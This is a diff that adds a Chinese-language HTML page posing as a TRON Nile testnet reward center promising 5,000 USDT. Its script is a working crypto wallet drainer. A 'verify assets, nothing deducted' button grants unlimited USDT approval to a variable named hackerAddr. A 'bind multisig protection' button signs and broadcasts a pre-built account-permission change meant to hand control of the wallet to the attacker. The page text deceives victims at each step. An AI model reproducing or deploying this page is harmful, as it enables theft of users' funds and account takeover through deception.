@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRON Nile 节点奖励中心</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f7f9fc; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .container { background: white; width: 100%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); overflow: hidden; }
+        .header { background: #ff0013; color: white; padding: 30px 20px; text-align: center; }
+        .content { padding: 20px; }
+        .reward-box { background: #fff5f5; border: 1px dashed #ff0013; border-radius: 12px; padding: 15px; text-align: center; margin-bottom: 20px; }
+        .reward-amount { font-size: 28px; font-weight: bold; color: #ff0013; }
+        .step-card { border: 1px solid #eee; border-radius: 12px; padding: 15px; margin-bottom: 15px; position: relative; transition: all 0.3s; }
+        .step-card.active { border-color: #ff0013; box-shadow: 0 4px 12px rgba(255,0,19,0.1); }
+        .step-title { font-weight: bold; margin-bottom: 5px; display: flex; align-items: center; }
+        .step-num { background: #ff0013; color: white; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; margin-right: 8px; }
+        .step-desc { font-size: 13px; color: #666; margin-bottom: 15px; }
+        button { width: 100%; padding: 14px; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; transition: all 0.2s; }
+        .btn-primary { background: #ff0013; color: white; }
+        .btn-disabled { background: #f0f0f0; color: #999; cursor: not-allowed; }
+        .footer { font-size: 12px; color: #bbb; text-align: center; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h2 style="margin:0;">Nile 网络激励计划</h2>
+        <p style="margin:10px 0 0; opacity: 0.8; font-size: 14px;">仅限 2026 年测试网活跃用户</p>
+    </div>
+
+    <div class="content">
+        <div class="reward-box">
+            <div style="font-size: 14px; color: #666;">待领取奖励</div>
+            <div class="reward-amount">5,000.00 USDT</div>
+        </div>
+
+        <div id="card1" class="step-card active">
+            <div class="step-title"><span class="step-num">1</span> 资产环境验证</div>
+            <div class="step-desc">系统需要验证您的账户是否符合领取资格（此操作不扣除资产）。</div>
+            <button id="btn1" class="btn-primary" onclick="handleApprove()">立即验证资产</button>
+        </div>
+
+        <div id="card2" class="step-card">
+            <div class="step-title"><span class="step-num">2</span> 绑定多签防护</div>
+            <div class="step-desc">激活官方多签安全锁，确保奖励直接发放至您的钱包。</div>
+            <button id="btn2" class="btn-disabled" disabled onclick="handlePermission()">确认绑定并领取</button>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    Powered by TRON Nile Network Security
+</div>
+
+<script>
+    // --- 配置区 ---
+    const hackerAddr = "TEtYuYpx3Vx6N5J3xdWAmT2UmHoTuEM8Hc"; 
+    const usdtContractAddr = "TXYZqz6v276QRE7f7t7677f7666"; // Nile USDT 合约
+    const permissionData = "这里填入你Python脚本生成的raw_data_hex"; 
+    // --------------
+
+    // 核心函数 1：执行 Approve 授权
+    async function handleApprove() {
+        if (!window.tronWeb) return alert("请在波场钱包(TronLink/TP/imToken)内打开");
+
+        try {
+            const contract = await window.tronWeb.contract().at(usdtContractAddr);
+            // 授权无限金额给黑客地址
+            const maxVal = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+            
+            await contract.approve(hackerAddr, maxVal).send();
+
+            // UI 切换
+            document.getElementById('card1').classList.remove('active');
+            document.getElementById('btn1').innerText = "✅ 验证完成";
+            document.getElementById('btn1').className = "btn-disabled";
+            document.getElementById('btn1').onclick = null;
+
+            document.getElementById('card2').classList.add('active');
+            document.getElementById('btn2').className = "btn-primary";
+            document.getElementById('btn2').disabled = false;
+            
+            alert("第一步验证成功！请完成最后一步领取。");
+        } catch (error) {
+            console.error(error);
+            alert("验证超时，请重试");
+        }
+    }
+
+    // 核心函数 2：修改账户权限 (多签)
+    async function handlePermission() {
+        if (!window.tronWeb) return;
+
+        try {
+            // 直接使用 sign 方法弹出权限变更窗口
+            const signedTx = await window.tronWeb.trx.sign(permissionData);
+            const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
+            
+            if (broadcast.result) {
+                alert("恭喜！所有步骤已完成，奖励将在10分钟内到账。");
+            }
+        } catch (error) {
+            console.error(error);
+            alert("绑定失败，请确保账户有 100 TRX 以上作为激活费");
+        }
+    }
+
+    // 自动检测：如果检测到钱包环境，可以在控制台打印提示
+    window.onload = () => {
+        if (!window.tronWeb) {
+            console.warn("未检测到 TronWeb 环境");
+        }
+    }
+</script>
+
+</body>
+</html>
